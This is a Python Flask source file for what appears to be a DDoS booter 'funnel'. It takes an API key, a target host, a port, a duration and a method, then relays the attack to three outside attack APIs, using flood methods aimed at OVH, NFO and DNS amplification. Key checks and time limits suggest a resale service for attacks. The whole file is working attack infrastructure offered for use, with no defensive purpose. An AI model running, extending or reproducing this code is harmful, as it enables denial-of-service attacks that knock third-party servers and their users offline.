# Python Funnel by Arx & Xplode hhh add yo keys and shi in settings.toml
from flask import Flask,send_file
from flask import request
from flask import jsonify
import random
import requests
import toml


config = toml.load('settings.toml')

apikeys = config.get('config').get('keys')
maxtime = int(config.get('config').get('maxtime'))
app = Flask(__name__)

@app.route("/")
def index():
    return "shiiii"

@app.route("/attack")
def attack():
    key = request.args.get('key')
    host = request.args.get('host')
    port = int(request.args.get('port'))
    time = int(request.args.get('time'))
    method = request.args.get('method')
    if key not in apikeys:
        return jsonify(
            error="True",
            message="API Key Invalid."
        ),451
    elif port > 65535:
        return jsonify(
            error="True",
            message="Invalid Port."
        ),451
    elif time > maxtime:
        return jsonify(
            error="True",
            message="Max Time Exceeded."
        ),451
    else:
        if method == 'OVHTCP':
            requests.get(f"https://api1.net/attack?host={host}&time={time}&port={port}&method=OACK")
            requests.get(f"https://api2.net/attack?host={host}&time={time}&port={port}&method=OVHTCPV2")
            requests.get(f"https://api3.net/attack?host={host}&time={time}&port={port}&method=SOCKET")
            return jsonify(
                error="False",
                host=host,
                port=port,
                time=time,
                method=method
            )
        elif method == 'NFO':
            requests.get(f"https://api1.net/attack?host={host}&time={time}&port={port}&method=NFOTCP")
            requests.get(f"https://api2.net/attack?host={host}&time={time}&port={port}&method=WRA")
            requests.get(f"https://api3.net/attack?host={host}&time={time}&port={port}&method=NFOMEXICANV45")
            return jsonify(
                error="False",
                host=host,
                port=port,
                time=time,
                method=method
            )
        elif method == 'DNS':
            requests.get(f"https://api1.net/attack?host={host}&time={time}&port={port}&method=DNS")
            requests.get(f"https://api2.net/attack?host={host}&time={time}&port={port}&method=AMPMIX")
            requests.get(f"https://api3.net/attack?host={host}&time={time}&port={port}&method=DNS")
            return jsonify(
                error="False",
                host=host,
                port=port,
                time=time,
                method=method
            )
        else:
           return jsonify(
               error="True",
               message="Method Not Found."
           ),451


app.run(host="0.0.0.0",port=1337) # choose wateva port u want